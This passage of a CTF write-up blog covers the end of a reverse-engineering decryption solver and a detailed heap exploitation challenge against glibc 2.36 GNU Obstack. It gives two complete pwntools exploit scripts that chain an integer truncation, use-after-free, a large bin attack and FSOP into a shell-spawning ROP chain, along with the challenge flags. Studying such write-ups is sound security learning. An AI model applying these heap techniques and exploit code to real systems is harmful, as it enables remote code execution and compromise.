    0x4d, 0x46, 0x20, 0x12, 0x34, 0x1f, 0x33, 0x31, 0x39, 0x35, 0x0e, 0x09, 0x2e, 0x47
]

# 3. Key
initial_key = 0x36316566 # "fe16"

# 4. Gi·∫£i m√£
current_key = initial_key
output_buffer = bytearray(300)

target_ints = []
for i in range(0, len(target_bytes), 4):
    if i+4 <= len(target_bytes):
        target_ints.append(struct.unpack('<I', target_bytes[i:i+4])[0])

for i in range(len(target_ints)):
    if i >= 0x4e: break
    
    target_val = target_ints[i]
    decrypted_val = target_val ^ current_key
    # Quan tr·ªçng: Key c·ªông d·ªìn, kh√¥ng reset
    current_key = (current_key + decrypted_val) & 0xFFFFFFFF
    
    offset = shuffle_indices[i]
    val_bytes = struct.pack('<I', decrypted_val)
    if offset + 4 <= len(output_buffer):
        output_buffer[offset:offset+4] = val_bytes

raw_str = output_buffer.split(b'\x00')[0].decode('latin-1', errors='ignore')
print(f"Flag: {raw_str}")
```

**Flag:** `csd{y0u_r34lly_k1nd4_JUST_54v3d_7h3_npld_fr0m_7h3_b1gg357_m4lw4r3_4774ck_3v3r}`
{:.prompt-flag}

---

## **The Final RCE**

> **Category:** Pwnable / Heap Exploitation
{: .prompt-info}

**Target:** glibc 2.36, GNU Obstack
**Techniques:** Signed Truncation, Use-After-Free, Large Bin Attack, FSOP (House of Apple 2)

### **Challenge Overview & Analysis**

The challenge provides a binary `chall` that implements a custom memory allocator using **GNU Obstack**. The environment uses `glibc 2.36`, which includes modern heap mitigations (e.g., removal of `__malloc_hook` and `__free_hook`, and safe-linking on tcache/fastbins).

Reverse engineering the binary reveals two critical vulnerabilities:

#### **Vulnerability A: Integer Overflow (Signed Truncation)**
In the `alloc` function, the user provides a `size` which is read as a 64-bit integer. However, during the calculation to update the obstack's internal `object_base` pointer, this size is cast to a **32-bit signed integer**.
*   **The Bug:** If we provide a size like `0xFFFF_FFF0` (4,294,967,280), the program interprets it as `-16` (`-0x10`) during pointer arithmetic.
*   **Impact:** This allows us to move the allocation cursor *backwards*. We can make the next chunk overlap with the previous chunk's data or metadata (headers).

#### **Vulnerability B: Use-After-Free (UAF) via `obstack_free`**
The `free` function allows the user to specify an index. If we trigger `free` on an uninitialized index (e.g., index 63), the program calls `obstack_free(obs, NULL)`.
*   **The Bug:** Passing `NULL` to `obstack_free` frees the entire obstack chunk (returning the memory to the glibc heap manager) but **does not clear the pointers** in the user's `chunks[]` array.
*   **Impact:** We retain read/write access to memory regions that have been returned to the system (Use-After-Free).

---

### **Exploitation Strategy**

The exploit chain requires four distinct phases to bypass ASLR and achieve Remote Code Execution (RCE).

#### **Phase 1: Leaking the Heap Base**
To manipulate the heap, we first need to know the absolute address of the obstack chunk.

1.  **Pivot:** We allocate a small chunk (Chunk 1) to act as a pivot point.
2.  **Cursor Regression:** We trigger the **Signed Truncation** bug by requesting an allocation of size `0xFFFF_FFF0`. This moves the obstack's internal "next free" pointer back by 16 bytes, placing it directly on top of the chunk's metadata headers.
3.  **Leak:** We allocate a new chunk (Chunk 0) at this position. When we print Chunk 0, we are actually printing the `chunk->limit` pointer stored in the metadata.
4.  **Calculation:**
    ```python
    Heap_Base = Leaked_Limit - Obstack_User_Size (0xFE0)
    ```

#### **Phase 2: Leaking Libc Base (Unsorted Bin)**
We need a Libc address to calculate the location of `_IO_list_all` and gadgets.

1.  **Heap Grooming:** We allocate a large chunk (Chunk A, size `0xFF0`).
2.  **Fake Header:** Using the truncation bug again, we overwrite Chunk A's size header, shrinking it from `0xFF0` to `0xF00`.
3.  **Consolidation Barrier:** We forge a fake "next chunk" (size `0x10`, `PREV_INUSE` bit set) immediately after Chunk A. This prevents glibc from merging Chunk A with the Top Chunk when freed.
4.  **Trigger UAF:** We call `free(63)` to trigger `obstack_free(NULL)`. Chunk A is freed to the **Unsorted Bin** because it is large and not adjacent to the top chunk.
5.  **Leak:** Since we have a UAF pointer to Chunk A, reading it returns the `fd` pointer, which points to `main_arena` in `libc.so.6`.
    ```python
    Libc_Base = Unsorted_Bin_Leak - 0x1D3CC0
    ```

#### **Phase 3: Large Bin Attack on `_IO_list_all`**
Since `malloc_hook` and `free_hook` are removed in glibc 2.36, we target the **File Stream (FILE)** structures. Specifically, we want to overwrite `_IO_list_all`, which is the head of the linked list of file streams flushed during `exit()`.

We use a **Large Bin Attack** to write a heap address into `_IO_list_all`:

1.  **Move to Large Bin:** We allocate a large chunk (Chunk B, `0x200`) to force the previously freed Chunk A (`0xF00`) from the Unsorted Bin into the Large Bin.
2.  **Corrupt Pointer:** Using UAF on Chunk A, we overwrite its `bk_nextsize` pointer:
    ```c
    A->bk_nextsize = _IO_list_all - 0x20;
    ```
3.  **Prepare Trigger:** We create a second chunk (Chunk B) and manipulate its size to be `0xE00`. This size falls into the *same* Large Bin index as Chunk A but is *smaller*.
4.  **Trigger:**
    *   We free Chunk B (`0xE00`) into the Unsorted Bin.
    *   We allocate a chunk larger than B.
    *   **The Logic:** glibc moves B to the Large Bin. Since B (`0xE00`) < A (`0xF00`), B is inserted *after* A. The insertion logic executes:
	
		```c
		victim->bk_nextsize->fd_nextsize = victim;
		```
        
		Substituting our corrupted pointer:
        
		```c
		*(_IO_list_all - 0x20 + 0x20) = Address_of_Chunk_B;
		// Result: _IO_list_all = Address_of_Chunk_B
	```

Now, `_IO_list_all` points to our controlled heap chunk B.

#### **Phase 4: FSOP (House of Apple 2)**
With control over `_IO_list_all`, we construct a fake `FILE` structure at Chunk B to hijack the execution flow when `exit()` is called.

**The Chain:** `exit()` $\to$ `_IO_flush_all_lockp` $\to$ `_IO_OVERFLOW`

**Payload Construction:**
1.  **Condition:** Set `_IO_write_ptr > _IO_write_base` to assume the buffer is full and trigger `_IO_OVERFLOW`.
2.  **Vtable Hijack:** Point `vtable` to `_IO_wfile_jumps` (a valid vtable in libc). This redirects `_IO_OVERFLOW` to `_IO_wfile_overflow`.
3.  **Wide Data Hijack:** `_IO_wfile_overflow` calls `_IO_wdoallocbuf`, which calls `fp->_wide_data->_wide_vtable->doallocate`.
4.  **Stack Pivot:** We overwrite the `doallocate` pointer in the fake wide vtable to point to `setcontext`.
5.  **ROP Chain:** `setcontext` loads CPU registers (including RSP and RIP) from the memory pointed to by `_wide_data`. We place a ROP chain inside `_wide_data` that executes `execve("/bin/sh", 0, 0)`.

---
### **Exploit Implementation**
Heap exploitation is inherently sensitive to the **Address Space Layout Randomization (ASLR)**. Specifically, the leak mechanism using `puts()` terminates at the first NULL byte (`\x00`). If a random heap address generated by the kernel contains a NULL byte in the middle, the leak is incomplete, causing the offset calculation to fail.

To address this, I have prepared two versions of the solution script:

#### **A. Standard Solver**
This is the primary solution. It executes the exploit chain once.
*   **Purpose:** Designed for the remote server which implements a **Proof of Work (PoW)**. Since calculating PoW is computationally expensive, we avoid brute-forcing connections.
*   **Expectation:** Requires a "good" ASLR layout. If it fails due to a bad pointer, it simply exits.

```python
#!/usr/bin/env python3
from pwn import *
import sys
import re

context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'info'

# --- PoW Configuration ---
POW_RE = re.compile(rb"sh -s ([^\s]+)")

HOST, PORT = "ctf.csd.lol", 2024

# --- Constants ---
CHUNK_USER_SIZE = 0xFE0
OFFSET_MAIN_ARENA = 0x1D3CC0
OFFSET_IO_LIST_ALL = 0x1D4660
OFFSET_WFILE_JUMPS = 0x1D00A0
MXCSR_VAL = 0x1F80

# --- Helper Functions ---

def solve_pow(r):
    log.info("Solving Proof of Work...")
    banner = r.recvuntil(b"solution: ")
    m = POW_RE.search(banner)
    if not m:
        raise ValueError(f"PoW token not found in: {banner!r}")
    token = m.group(1).decode()
    try:
        solution = subprocess.check_output(["./redpwnpow", token]).strip()
        r.sendline(solution)
    except FileNotFoundError:
        log.error("./redpwnpow not found. Please ensure the PoW solver binary is present.")
        sys.exit(1)

def start_process():
    if args.REMOTE:
        r = remote(HOST, PORT)
        solve_pow(r)
        return r
    else:
        return process("./chall")

def consume_prompt(r):
    # Sync output to avoid pointer misalignment
    r.recvuntil(b"0) exit\n> ")

def add_chunk(r, idx, size, content=b""):
    payload = f"1\n{idx}\n{size}\n".encode()
    if size != 0:
        payload += content
    r.send(payload)
    consume_prompt(r)

def delete_chunk(r, idx):
    r.send(f"2\n{idx}\n".encode())
    consume_prompt(r)

def edit_chunk(r, idx, content):
    r.send(f"3\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    r.send(content)
    consume_prompt(r)

def view_chunk(r, idx):
    r.send(f"4\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    # Receive data until the menu appears again
    raw_data = r.recvuntil(b"1) alloc\n", drop=True)
    consume_prompt(r)
    
    if raw_data.endswith(b"\n"):
        return raw_data[:-1]
    return raw_data

def unpack_u64(data):
    return u64(data.ljust(8, b"\x00"))

def get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target):
    """
    Leak chunk->limit pointer by using integer overflow to rewind obstack cursor.
    """
    delete_chunk(r, idx_pivot)
    add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z") # Integer overflow (-16)
    add_chunk(r, idx_target, 0, b"")
    
    leak = view_chunk(r, idx_target)
    if leak:
        return unpack_u64(leak)

    # Fallback: Brute force if pointer starts with null byte (puts truncates)
    for pad_len in range(1, 8):
        delete_chunk(r, idx_pivot)
        add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
        # Overwrite pad_len bytes at the start of the pointer
        add_chunk(r, idx_target, pad_len, b"A" * pad_len)
        
        leak = view_chunk(r, idx_target)
        # If output is longer than padding -> leaked the rest of the pointer
        if len(leak) > pad_len:
            # Recover pointer (prepend null bytes + leaked tail)
            recovered_ptr = unpack_u64(b"\x00"*pad_len + leak[pad_len:])
            
            # Clean up heap
            delete_chunk(r, idx_pivot)
            add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
            add_chunk(r, idx_target, pad_len, b"\x00"*pad_len)
            
            return recovered_ptr
            
    log.error("Failed to recover chunk metadata")
    sys.exit(1)

def get_obstack_addrs(r, idx_pivot, idx_overflow, idx_target):
    limit = get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target)
    base = limit - CHUNK_USER_SIZE
    header = base - 0x10
    return base, header, limit

def construct_fsop_payload(libc_obj, header_addr, shell_cmd):
    """
    Manually construct Fake FILE payload to bypass flat() limitations and ensure correct layout.
    """
    # Addresses
    addr_wfile_jumps = libc_obj.address + OFFSET_WFILE_JUMPS
    addr_setcontext = libc_obj.sym['setcontext']
    addr_binsh = next(libc_obj.search(b"/bin/sh\x00"))
    
    # Gadgets
    gadget_pop_rdi = next(libc_obj.search(asm('pop rdi; ret')))
    gadget_pop_rax_rdx_rbx = next(libc_obj.search(asm('pop rax; pop rdx; pop rbx; ret')))
    gadget_syscall = next(libc_obj.search(asm('syscall; ret')))

    # Internal offsets relative to chunk header
    off_wide_data = 0x108
    off_wide_vtable = 0x188
    off_fenv = 0x1A0
    
    addr_wide_data = header_addr + off_wide_data
    addr_wide_vtable = header_addr + off_wide_vtable
    addr_fenv = header_addr + off_fenv

    # ROP / Args locations inside wide_data
    addr_argv = addr_wide_data + 0x38
    addr_argc = addr_wide_data + 0x58
    addr_cmd = addr_wide_data + 0x60

    # Buffer 0x200 bytes
    payload_buf = bytearray(b"\x00" * 0x200)

    def pack_qword(offset, val):
        payload_buf[offset:offset+8] = p64(val)
    def pack_dword(offset, val):
        payload_buf[offset:offset+4] = p32(val)

    # 1. Fake _IO_FILE
    pack_dword(0x00, 0) # _flags
    pack_qword(0x20, 0) # _IO_write_base
    pack_qword(0x28, 1) # _IO_write_ptr > base (triggers overflow)
    pack_qword(0x68, 0) # _chain
    pack_qword(0x70, addr_argv) # RSI for setcontext
    pack_qword(0x88, 0) # RDX for setcontext
    pack_qword(0xA0, addr_wide_data) # RSP for setcontext
    pack_qword(0xA8, gadget_pop_rdi) # RIP for setcontext
    pack_dword(0xC0, 0) # _mode
    pack_qword(0xD8, addr_wfile_jumps) # vtable
    
    # setcontext specific: pointer to fenv
    pack_qword(0xE0, addr_fenv)
    pack_dword(0x1C0, MXCSR_VAL) # mxcsr

    # 2. Fake _IO_wide_data (acts as ROP stack)
    # ROP Chain: execve("/bin/sh", argv, NULL)
    
    # 0x00: pop rdi
    pack_qword(off_wide_data + 0x00, addr_binsh)
    # 0x08: pop rax; pop rdx; pop rbx
    pack_qword(off_wide_data + 0x08, gadget_pop_rax_rdx_rbx)
    # 0x10: RAX = 59 (execve)
    pack_qword(off_wide_data + 0x10, 59)
    # 0x18: RDX = 0
    pack_qword(off_wide_data + 0x18, 0)
    # 0x20: RBX = 0
    pack_qword(off_wide_data + 0x20, 0)
    # 0x28: syscall
    pack_qword(off_wide_data + 0x28, gadget_syscall)
    # 0x30: space
    pack_qword(off_wide_data + 0x30, 0)
    
    # Argv Array construction
    # argv[0] = /bin/sh
    pack_qword((addr_argv - header_addr) + 0x00, addr_binsh)
    # argv[1] = -c
    pack_qword((addr_argv - header_addr) + 0x08, addr_argc)
    # argv[2] = cmd
    pack_qword((addr_argv - header_addr) + 0x10, addr_cmd)
    # argv[3] = NULL
    pack_qword((addr_argv - header_addr) + 0x18, 0)
    
    # Strings
    c_off = addr_argc - header_addr
    payload_buf[c_off : c_off+3] = b"-c\x00"
    
    cmd_off = addr_cmd - header_addr
    payload_buf[cmd_off : cmd_off + len(shell_cmd) + 1] = shell_cmd + b"\x00"

    # Pointer to wide_vtable
    pack_qword(off_wide_data + 0xE0, addr_wide_vtable)

    # 3. Fake Wide VTable
    # offset 0x68: doallocate -> setcontext
    pack_qword(off_wide_vtable + 0x68, addr_setcontext)

    # 4. FEnv data (for setcontext)
    fenv_data = b"\x7f\x03\x00\x00\xff\xff" + b"\x00"*22
    payload_buf[off_fenv : off_fenv + len(fenv_data)] = fenv_data

    return bytes(payload_buf)

def main():
    r = start_process()

    # --- Step 1: Heap Leak ---
    log.info("Step 1: Leaking Heap addresses...")
    add_chunk(r, 1, 0, b"") # Pivot
    
    # Allocate to move cursor back
    add_chunk(r, 9, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 0, 0, b"")
    
    chunk_A_base, chunk_A_hdr, _ = get_obstack_addrs(r, 1, 9, 0)
    pivot_A = chunk_A_base + 0x10
    log.success(f"Chunk A Base: {hex(chunk_A_base)}")

    # --- Step 2: Libc Leak ---
    log.info("Step 2: Leaking Libc from Unsorted Bin...")
    
    # Setup persistent pointer
    delete_chunk(r, 1)
    add_chunk(r, 2, 0x10, b"A"*0x10)
    
    # Shrink A (0xFF0 -> 0xF00) to prevent consolidation
    delete_chunk(r, 1)
    add_chunk(r, 3, 0xFFFF_FFE0, b"Z") # Shift -0x20
    # Overwrite header: Prev_Size=0, Size=0xF01 | PREV_INUSE
    add_chunk(r, 4, 0x10, p64(0) + p64(0xF01))
    
    # Realign
    delete_chunk(r, 1)
    add_chunk(r, 5, 0xEE0, b"FILLER")
    # Fake next chunk
    add_chunk(r, 6, 0x10, p64(0xF00) + p64(0xF1))
    
    # Freeing invalid index triggers obstack_free(NULL) -> Frees A
    delete_chunk(r, 63)
    
    # Read stale pointer in index 0
    raw_leak = view_chunk(r, 0)
    if not raw_leak:
        log.error("Failed to leak unsorted bin fd")
        
    unsorted_bin_fd = unpack_u64(raw_leak)
    libc.address = unsorted_bin_fd - OFFSET_MAIN_ARENA
    log.success(f"Libc Base: {hex(libc.address)}")

    # --- Step 3: Large Bin Attack ---
    log.info("Step 3: Executing Large Bin Attack on _IO_list_all...")
    
    addr_io_list_all = libc.address + OFFSET_IO_LIST_ALL
    
    # Create Chunk B (0x200) to flush A to Large Bin
    add_chunk(r, 10, 0x200, b"Chunk_B")
    
    # Corrupt A's bk_nextsize (UAF)
    # Target: _IO_list_all - 0x20
    edit_chunk(r, 2, p64(chunk_A_hdr) + p64(addr_io_list_all - 0x20))
    
    # Leak B info
    chunk_B_base, chunk_B_hdr, chunk_B_limit = get_obstack_addrs(r, 10, 11, 12)
    chunk_B_pivot = chunk_B_base + 0x10
    log.info(f"Chunk B Base: {hex(chunk_B_base)}")
    
    # Manipulate B to perform attack
    delete_chunk(r, 10)
    add_chunk(r, 17, 0xFFFF_FFF0, b"Z")
    # Clear prev field
    add_chunk(r, 18, 0x10, p64(chunk_B_limit) + p64(0))
    
    # Shrink B: 0xFF0 -> 0xE00
    delete_chunk(r, 10)
    add_chunk(r, 13, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 14, 0x10, p64(0) + p64(0xE01))
    
    delete_chunk(r, 10)
    # Pad to alignment
    pad_size = (chunk_B_hdr + 0xE00 - chunk_B_pivot) & 0xFFFFFFFF
    add_chunk(r, 15, pad_size, b"PADDING")
    add_chunk(r, 16, 0x10, p64(0xE00) + p64(0x1F1))
    
    # Free obstack -> B (0xE00) goes to Unsorted Bin
    delete_chunk(r, 63)
    
    # Allocate Chunk C -> Forces B into Large Bin
    # B (0xE00) < A (0xF00) => Insert at tail => Write to _IO_list_all
    try:
        add_chunk(r, 30, 0x200, b"Trigger")
    except EOFError:
        pass # Might crash or close, but we continue to overwrite
        
    # --- Step 4: FSOP Payload ---
    log.info("Step 4: Overwriting _IO_list_all target with Fake FILE...")
    
    # We need C's anchor to calculate overwrite length
    chunk_C_base, _, _ = get_obstack_addrs(r, 30, 31, 32)
    chunk_C_pivot = chunk_C_base + 0x10
    
    cmd = b"cat flag* /flag 2>/dev/null"
    payload = construct_fsop_payload(libc, chunk_B_hdr, cmd)
    
    delete_chunk(r, 30)
    # Shift cursor from C to B_Header
    shift_len = (chunk_B_hdr - chunk_C_pivot) & 0xFFFFFFFF
    add_chunk(r, 40, shift_len, b"SHIFT")
    
    # Write Payload
    add_chunk(r, 41, len(payload), payload)
    
    # Trigger exit
    r.sendline(b"0")
    
    # Output flag
    print(r.recvall(timeout=3).decode(errors="ignore"))

if __name__ == "__main__":
    main()
```

#### **B. Robust Solver**
This version wraps the exploit logic in an infinite loop (`while True`) with exception handling.
*   **Purpose:** Optimized for **local testing** or environments without strict rate-limiting.
*   **Mechanism:** If the exploit fails (e.g., due to a NULL byte in the leaked address or bad heap alignment caused by ASLR), it catches the error and **automatically restarts** the process. This ensures that we eventually hit a favorable memory layout and retrieve the flag.

```python
#!/usr/bin/env python3
from pwn import *
import sys
import re
import subprocess

# --- Configuration ---
context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'info'

HOST, PORT = "ctf.csd.lol", 2024
POW_RE = re.compile(rb"sh -s ([^\s]+)")

# --- Constants & Offsets (GLIBC 2.36) ---
CHUNK_USER_SIZE = 0xFE0
OFFSET_MAIN_ARENA = 0x1D3CC0
OFFSET_IO_LIST_ALL = 0x1D4660
OFFSET_WFILE_JUMPS = 0x1D00A0
MXCSR_VAL = 0x1F80

# --- Helper Functions ---

def solve_pow(r):
    log.info("Solving Proof of Work...")
    banner = r.recvuntil(b"solution: ")
    m = POW_RE.search(banner)
    if not m: return
    token = m.group(1).decode()
    try:
        solution = subprocess.check_output(["./redpwnpow", token]).strip()
        r.sendline(solution)
    except:
        log.warning("PoW solver failed/missing. Skipping...")

def start_process():
    if args.REMOTE:
        r = remote(HOST, PORT)
        solve_pow(r)
        return r
    else:
        return process("./chall")

def consume_prompt(r):
    r.recvuntil(b"0) exit\n> ")

def add_chunk(r, idx, size, content=b""):
    r.send(f"1\n{idx}\n{size}\n".encode())
    if size != 0: r.send(content)
    consume_prompt(r)

def delete_chunk(r, idx):
    r.send(f"2\n{idx}\n".encode())
    consume_prompt(r)

def edit_chunk(r, idx, content):
    r.send(f"3\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    r.send(content)
    consume_prompt(r)

def view_chunk(r, idx):
    r.send(f"4\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    raw_data = r.recvuntil(b"1) alloc\n", drop=True)
    consume_prompt(r)
    if raw_data.endswith(b"\n"): return raw_data[:-1]
    return raw_data

def unpack_u64(data):
    return u64(data.ljust(8, b"\x00"))

def get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target):
    """
    Attempts to leak the chunk limit pointer.
    Includes brute-force padding to handle null bytes in ASLR addresses.
    """
    delete_chunk(r, idx_pivot)
    add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
    add_chunk(r, idx_target, 0, b"")
    
    leak = view_chunk(r, idx_target)
    if leak: return unpack_u64(leak)

    for pad_len in range(1, 8):
        delete_chunk(r, idx_pivot)
        add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
        add_chunk(r, idx_target, pad_len, b"A" * pad_len)
        leak = view_chunk(r, idx_target)
        if len(leak) > pad_len:
            delete_chunk(r, idx_pivot)
            add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
            add_chunk(r, idx_target, pad_len, b"\x00"*pad_len)
            return unpack_u64(b"\x00"*pad_len + leak[pad_len:])
            
    raise RuntimeError("Failed to leak metadata (Bad ASLR byte)")

def get_obstack_addrs(r, idx_pivot, idx_overflow, idx_target):
    limit = get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target)
    base = limit - CHUNK_USER_SIZE
    header = base - 0x10
    return base, header, limit

def construct_fsop_payload(libc_obj, header_addr, shell_cmd):
    """
    Constructs a Fake FILE structure for House of Apple 2 / FSOP.
    Target chain: _IO_wfile_overflow -> _IO_wdoallocbuf -> setcontext
    """
    addr_wfile_jumps = libc_obj.address + OFFSET_WFILE_JUMPS
    addr_setcontext = libc_obj.sym['setcontext']
    addr_binsh = next(libc_obj.search(b"/bin/sh\x00"))
    gadget_pop_rdi = next(libc_obj.search(asm('pop rdi; ret')))
    gadget_pop_rax_rdx_rbx = next(libc_obj.search(asm('pop rax; pop rdx; pop rbx; ret')))
    gadget_syscall = next(libc_obj.search(asm('syscall; ret')))

    off_wide_data = 0x108
    off_wide_vtable = 0x188
    off_fenv = 0x1A0
    addr_wide_data = header_addr + off_wide_data
    addr_wide_vtable = header_addr + off_wide_vtable
    addr_fenv = header_addr + off_fenv
    addr_argv = addr_wide_data + 0x38
    addr_argc = addr_wide_data + 0x58
    addr_cmd = addr_wide_data + 0x60

    payload_buf = bytearray(b"\x00" * 0x200)
    def pack_qword(offset, val): payload_buf[offset:offset+8] = p64(val)
    def pack_dword(offset, val): payload_buf[offset:offset+4] = p32(val)

    # 1. Fake _IO_FILE
    pack_dword(0x00, 0); pack_qword(0x20, 0); pack_qword(0x28, 1); pack_qword(0x68, 0)
    pack_qword(0x70, addr_argv); pack_qword(0x88, 0); pack_qword(0xA0, addr_wide_data)
    pack_qword(0xA8, gadget_pop_rdi); pack_dword(0xC0, 0); pack_qword(0xD8, addr_wfile_jumps)
    pack_qword(0xE0, addr_fenv); pack_dword(0x1C0, MXCSR_VAL)

    # 2. Fake _IO_wide_data (ROP Stack)
    pack_qword(off_wide_data, addr_binsh)
    pack_qword(off_wide_data + 8, gadget_pop_rax_rdx_rbx)
    pack_qword(off_wide_data + 16, 59); pack_qword(off_wide_data + 24, 0)
    pack_qword(off_wide_data + 32, 0); pack_qword(off_wide_data + 40, gadget_syscall)
    pack_qword(off_wide_data + 48, 0)
    
    # Argv Array construction
    pack_qword((addr_argv - header_addr), addr_binsh)
    pack_qword((addr_argv - header_addr) + 8, addr_argc)
    pack_qword((addr_argv - header_addr) + 16, addr_cmd)
    pack_qword((addr_argv - header_addr) + 24, 0)
    
    # Command Strings
    c_off = addr_argc - header_addr
    payload_buf[c_off : c_off+3] = b"-c\x00"
    cmd_off = addr_cmd - header_addr
    payload_buf[cmd_off : cmd_off + len(shell_cmd) + 1] = shell_cmd + b"\x00"
    
    # 3. Fake Wide VTable -> setcontext
    pack_qword(off_wide_data + 0xE0, addr_wide_vtable)
    pack_qword(off_wide_vtable + 0x68, addr_setcontext)
    
    # 4. FEnv data
    fenv_data = b"\x7f\x03\x00\x00\xff\xff" + b"\x00"*22
    payload_buf[off_fenv : off_fenv + len(fenv_data)] = fenv_data

    return bytes(payload_buf)

def exploit(r):
    # [1] Leak Heap Base
    log.info("Phase 1: Leaking Heap...")
    add_chunk(r, 1, 0, b"")
    add_chunk(r, 9, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 0, 0, b"")
    chunk_A_base, chunk_A_hdr, _ = get_obstack_addrs(r, 1, 9, 0)
    log.success(f"Chunk A Base: {hex(chunk_A_base)}")

    # [2] Leak Libc (Unsorted Bin)
    log.info("Phase 2: Leaking Libc...")
    delete_chunk(r, 1); add_chunk(r, 2, 0x10, b"A"*0x10)
    # Shrink chunk A (0xFF0 -> 0xF00)
    delete_chunk(r, 1); add_chunk(r, 3, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 4, 0x10, p64(0) + p64(0xF01))
    # Padding and Fake next chunk
    delete_chunk(r, 1); add_chunk(r, 5, 0xEE0, b"F")
    add_chunk(r, 6, 0x10, p64(0xF00) + p64(0xF1))
    # Trigger obstack_free(NULL)
    delete_chunk(r, 63)
    
    leak = view_chunk(r, 0)
    if not leak: raise RuntimeError("Unsorted bin leak failed")
    
    libc.address = unpack_u64(leak) - OFFSET_MAIN_ARENA
    log.success(f"Libc Base: {hex(libc.address)}")
    
    # Alignment check (ASLR sanity check)
    if (libc.address & 0xfff) != 0: raise RuntimeError("Bad Libc Alignment")

    # [3] Large Bin Attack
    log.info("Phase 3: Large Bin Attack...")
    add_chunk(r, 10, 0x200, b"B")
    # Overwrite A->bk_nextsize
    edit_chunk(r, 2, p64(chunk_A_hdr) + p64(libc.address + OFFSET_IO_LIST_ALL - 0x20))
    chunk_B_base, chunk_B_hdr, chunk_B_limit = get_obstack_addrs(r, 10, 11, 12)
    
    # Prepare B for Large Bin insertion
    delete_chunk(r, 10); add_chunk(r, 17, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 18, 0x10, p64(chunk_B_limit) + p64(0))
    # Shrink B (0xFF0 -> 0xE00)
    delete_chunk(r, 10); add_chunk(r, 13, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 14, 0x10, p64(0) + p64(0xE01))
    delete_chunk(r, 10)
    # Realign
    add_chunk(r, 15, (chunk_B_hdr + 0xE00 - (chunk_B_base+0x10)) & 0xFFFFFFFF, b"P")
    add_chunk(r, 16, 0x10, p64(0xE00) + p64(0x1F1))
    delete_chunk(r, 63)
    
    # Trigger Attack: B < A -> B inserted into list -> _IO_list_all overwritten
    try: add_chunk(r, 30, 0x200, b"T")
    except: pass

    # [4] FSOP Payload
    log.info("Phase 4: Sending FSOP Payload...")
    c_base, _, _ = get_obstack_addrs(r, 30, 31, 32)
    payload = construct_fsop_payload(libc, chunk_B_hdr, b"cat flag* /flag 2>/dev/null")
    
    delete_chunk(r, 30)
    # Write payload to B_Header (now _IO_list_all)
    add_chunk(r, 40, (chunk_B_hdr - (c_base+0x10)) & 0xFFFFFFFF, b"S")
    add_chunk(r, 41, len(payload), payload)
    
    # Exit -> _IO_flush_all -> shell
    flag = r.recvuntil(b"}").decode(errors="ignore")
    
    if "csd{" in flag:
        print("Flag: " + flag.strip())
        return True
    return False

def main():
    attempt = 1
    # Auto-Retry Loop for ASLR stability
    while True:
        log.info(f"--- ATTEMPT {attempt} ---")
        try:
            r = start_process()
            if exploit(r):
                r.close()
                break
            r.close()
        except KeyboardInterrupt:
            exit(0)
        except Exception as e:
            log.warning(f"Exploit failed: {e}. Retrying due to bad ASLR layout...")
            try: r.close()
            except: pass
        attempt += 1

if __name__ == "__main__":
    main()
```

### **Conclusion**

This exploit demonstrates a complex chain of vulnerabilities. By combining a legacy `obstack` pointer arithmetic bug with a modern glibc Large Bin Attack and FSOP techniques, we successfully bypassed NX, PIE, and ASLR to achieve full remote code execution.

**Flag:** `csd{50m37h1n9_50M37H1n9_0b574ck5_L0l}`
{: .prompt-flag}


## T·ªïng k·∫øt
Advent of CTF 2025 ƒë√£ k·∫øt th√∫c v·ªõi nhi·ªÅu th·ª≠ th√°ch th√∫ v·ªã v√† ƒëa d·∫°ng. Qua ƒë√¢y b·∫£n th√¢n m√¨nh ƒë√£ h·ªçc ƒë∆∞·ª£c r·∫•t nhi·ªÅu ki·∫øn th·ª©c m·ªõi v·ªÅ b·∫£o m·∫≠t. M·ªói th·ª≠ th√°ch ƒë·ªÅu mang ƒë·∫øn nh·ªØng b√†i h·ªçc qu√Ω gi√° v√† gi√∫p m√¨nh n√¢ng cao k·ªπ nƒÉng ph√¢n t√≠ch, t∆∞ duy logic c≈©ng nh∆∞ kh·∫£ nƒÉng gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ. Tr√™n ƒë√¢y ch·ªâ l√† c√°ch gi·∫£i c·ªßa m√¨nh v√† c√≤n r·∫•t nhi·ªÅu c√°ch ti·∫øp c·∫≠n kh√°c nhau ƒë·ªÉ gi·∫£i quy·∫øt c√°c th·ª≠ th√°ch n√†y. M√¨nh hy v·ªçng nh·ªØng chia s·∫ª n√†y s·∫Ω gi√∫p √≠ch cho c√°c b·∫°n trong vi·ªác h·ªçc t·∫≠p v√† nghi√™n c·ª©u v·ªÅ b·∫£o m·∫≠t. C·∫£m ∆°n m·ªçi ng∆∞·ªùi ƒë√£ theo d√µi!